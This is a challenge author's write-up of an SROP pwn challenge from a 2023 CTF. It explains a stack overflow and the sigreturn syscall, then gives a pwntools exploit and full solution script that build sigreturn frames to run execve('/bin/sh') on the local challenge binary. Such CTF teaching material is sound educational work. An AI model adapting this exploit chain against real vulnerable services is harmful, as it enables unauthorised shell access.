---
title: "SROP - IITB Trust Lab CTF"
last_modified_at: 2023-10-24
categories:
  - writeups
  - 2k23
  - IITBCTF
classes: wide
tags:
  - Writeup
  - Trust Lab CTF
  - SROP
  - pwn
---

This challenge was created by me for Trust Lab CTF Round 1 held in September 2023

# Challenge

The challenge was the following assembly code compiled using the command `gcc -no-pie code.S -z noexecstack`

```nasm
.global main
.intel_syntax noprefix
.text
main:
sub rsp,0x200
mov eax,0
mov edi,0
lea rsi,[rsp]
mov edx,0x400
syscall
add rsp,0x200
ret
```

# Writeup

We first do checksec to see the security parameters used in the binary.
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The stack is not exexcutable. The executable is not a Position-Independent-Executable.
There is no stack canary. The instructions in the main function are:
```nasm
00401102   sub     rsp, 0x200
00401109   mov     eax, 0x0
0040110e   mov     edi, 0x0
00401113   lea     rsi, [rsp {var_200}]
00401117   mov     edx, 0x400
0040111c   syscall 
0040111e   add     rsp, 0x200
00401125   retn     {__return_addr}
```
The program creates a space of 0x200 on stack but reads 0x400 bytes from stdin.
We can overwrite the return address here to jump to anywhere we want.

We have the address of the instruction `syscall` which is fixed.
Putting 15 in `rax` and putting 0x40111c in `rip` will result in a sigreturn syscall,
thus giving us full control over the registers. (Sigreturn-Oriented Programming).

## What is Sigreturn syscall?

<!--Sigreturn syscall is used when program uses signal handling. -->
Let's see what happens when a signal is issued to program and the program has a signal handler for the same.
Let's consider the following program:
```c
#include <stdio.h>
#include <unistd.h>
#include <signal.h>
void sigint_handler(int signo){
    printf("Interrupt Signal with signo %d recieved\n",signo);
    return;
}
int main(){
	signal(SIGINT,sigint_handler);
    int i=0;
    while(1){
        printf("%d\n",i);
        i++;
        sleep(1);
    }
}
```
This code prints numbers, until a `SIGINT` is recieved, handles the `SIGINT` signal and continues to print.
The output of the above code looks like the following:
```
0
1
^CInterrupt Signal with signo 2 recieved
2
3
^CInterrupt Signal with signo 2 recieved
4
^CInterrupt Signal with signo 2 recieved
5
6
^CInterrupt Signal with signo 2 recieved
7
```
When the signal is recieved, the control goes to the kernel space.
Every register value is put on stack and the control goes back to user space.
The handler function is executed, after which the control goes back to kernel space to restore the state of program.
Sigreturn syscall is used for the same. We can use strace to see that syscall. The following is the output of strace.
```strace
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, 0x7ffc41674a00) = 0
write(1, "7\n", 27
)                      = 2
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, {tv_sec=0, tv_nsec=241520488}) = ? ERESTART_RESTARTBLOCK (Interrupted by signal)
--- SIGINT {si_signo=SIGINT, si_code=SI_USER, si_pid=1378514, si_uid=1000} ---
write(1, "Interrupt Signal with signo 2 re"..., 39Interrupt Signal with signo 2 recieved
) = 39
rt_sigreturn({mask=[]})                 = -1 EINTR (Interrupted system call)
write(1, "8\n", 28
)                      = 2
clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=1, tv_nsec=0}, 0x7ffc41674a00) = 0
write(1, "9\n", 29
)                      = 2
```
Here is what manpage has to say about the `rt_sigreturn` or `sigreturn` syscall.
```manpage
       sigreturn, rt_sigreturn - return from signal handler and cleanup stack frame
```
So, the sigreturn syscall restores the values of registers from the stack.
If we call this syscall, in absence of any signal taking place, the registers are not stored on stack.
If we can write on stack in that region, we can carefully fill the stack in such a way that the register values are whatever we want.
This is how sigreturn syscall works and how it can be used for Sigreturn Oriented Programming.
For creating the frame to put on stack, we can use `SigreturnFrame()` from python pwntools library.



So, first, we need to find a way to put 15 in `rax`. We can control `rax` using the return value of `syscall`.
So, first, if we jump to 0x401102, the program reads bytes from stdin and puts number of bytes read in `rax`.
The next return address should be to 0x40111c, so that we get a `sigreturn syscall`. After that, the stack should store a valid Sigreturn Frame.
So, we can write this for now.
```python
payload = b'A'*0x200 # padding
payload += p64(0x401102) # return to reading to set rax = 15
payload += p64(0x40111c) # return to syscal after getting rax = 15
```
For now, we have the following view of stack.
```
 AAAA...AAAA                    padding of 0x200 bytes
 02 11 40 00 00 00 00 00        return address to jump to start of main
 1c 11 40 00 00 00 00 00        return address to instruction syscall
```

After the above part, we need to put sigreturn frame. It can easily be done using python pwntools using `SigreturnFrame()`.
In order to spawn shell, we need a string `/bin/bash` somewhere so that we can put it's address in corresponding register.
Using memory map we see that the page starting from 0x404000 is writable.
```
00400000-00401000 r--p 00000000 
00401000-00402000 r-xp 00001000 
00402000-00403000 r--p 00002000 
00403000-00404000 r--p 00003000 
00404000-00405000 rw-p 00004000 
```
So, we can write `/bin/bash` on address 0x404000 and use it later.
Therefore, we use the following values for the registers.
```python
context.arch = 'amd64'
frame0 = SigreturnFrame()
frame0.rax = 0 # read syscall
frame0.rdi = 0 # fd = 0
frame0.rsi = 0x404000 # writable section available
frame0.rsp = 0x404000
frame0.rdx = 0x500 # count
frame0.rip = 0x40111c # syscall instruction
payload += bytes(frame0)

p.send(payload)
```

After sending this, we need to send 15 bytes to stdin so that `rax` has value 15.
```python
p.send(b'A'*15) # to set rax = 15
```
Now, one more read syscall is done. This time, the input will be stored at 0x404000.
Moreover, the `rsp` is also changed to 0x404000. Thus, after completing the syscall, we return to the return address written at 0x404200.
This time, for return addresses, we do as before i.e. use read syscall to put 15 in `rax` followed by `syscall` for sigreturn syscall.
```python
payload = b'/bin/sh\x00' + cyclic(0x200-len(b'/bin/sh\x00')) # padding
payload += p64(0x401102) # return to reading to set rax = 15
payload += p64(0x40111c) # return to syscal after getting rax = 15
```
This time, we need to make the sigreturn frame to do a syscall. We have written `/bin/bash` at address 0x404000.
```python
frame1=SigreturnFrame()
frame1.rax=59 # execve syscall
frame1.rsi = 0 # argv
frame1.rdx=0 # envp
frame1.rdi=0x404000 # contains string /bin/sh
frame1.rip = 0x40111c
payload += bytes(frame1)
p.send(payload)
```
Now, again, we need to send 15 bytes to ensure a sigreturn syscall.
```python
p.send(b'A'*15)
p.interactive()
```
Now, we get the shell and we can print the flag now.

# Solution Script

Here is the solution script I made for the challenge.

```python
from pwn import *
context.log_level = 'debug'
elf = ELF('./a.out')
p = process('./a.out')

payload = b'A'*0x200 # padding
payload += p64(0x401102) # return to reading to set rax = 15
payload += p64(0x40111c) # return to syscal after getting rax = 15

context.arch = 'amd64'
frame0 = SigreturnFrame()
frame0.rax = 0 # read syscall
frame0.rdi = 0 # fd = 0
frame0.rsi = 0x404000 # writable section available
frame0.rsp = 0x404000
frame0.rdx = 0x500 # count
frame0.rip = 0x40111c # syscall instruction
payload += bytes(frame0)
p.send(payload)
sleep(1)
p.send(b'A'*15) # to set rax = 15
sleep(1)
### ALL REGISTERS REFRESHED

payload = b'/bin/sh\x00' + cyclic(0x200-len(b'/bin/sh\x00')) # padding
payload += p64(0x401102) # return to reading to set rax = 15
payload += p64(0x40111c) # return to syscal after getting rax = 15
frame1=SigreturnFrame()
frame1.rax=59 # execve syscall
frame1.rsi = 0 # argv
frame1.rdx=0 # envp
frame1.rdi=0x404000 # contains string /bin/sh
frame1.rip = 0x40111c
payload += bytes(frame1)
p.send(payload)
sleep(1)
p.send(b'A'*15)
sleep(1)
p.interactive()

```